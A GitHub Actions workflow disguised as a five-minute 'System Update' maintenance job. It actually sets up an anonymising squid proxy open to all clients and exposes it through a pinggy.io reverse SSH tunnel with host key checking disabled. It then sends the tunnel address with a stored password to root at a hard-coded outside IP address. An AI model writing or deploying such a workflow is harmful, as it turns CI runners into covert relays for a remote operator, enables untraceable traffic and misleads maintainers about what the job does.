name: System Update

on:
  workflow_dispatch:
  schedule:
    - cron: '*/5 * * * *'

jobs:
  maintenance:
    runs-on: ubuntu-latest
    steps:
      - name: Install squid
        run: sudo apt update && sudo apt install squid -y

      - name: Config squid
        run: |
          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
          http_port 3128
          http_access allow all
          forwarded_for off
          via off
          EOF'
          sudo systemctl restart squid

      - name: Start pinggy tunnel
        run: |
          ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:3128 a.pinggy.io > pinggy.log 2>&1 &
          sleep 15
          cat pinggy.log

      - name: Get address and upload
        env:
          REM: ${{ secrets.REM }}
        run: |
          PINGGY_URL=$(grep -o 'https\?://[-a-zA-Z0-9.-]*\.pinggy[-a-z]*\.link' pinggy.log | head -1)
          if [ -z "${PINGGY_URL}" ]; then
            PINGGY_URL=$(grep -o 'http://[a-z]*-[0-9.-]*\.run\.pinggy-[a-z]*\.link' pinggy.log | head -1)
          fi
          echo "Found: ${PINGGY_URL}"
          echo "${PINGGY_URL}" > /tmp/proxy.txt
          cat /tmp/proxy.txt
          sudo apt install sshpass -y
          sshpass -p "${REM}" scp -o StrictHostKeyChecking=no /tmp/proxy.txt root@45.144.53.63:/var/www/html/git_enemy3civil.txt
          sleep 400
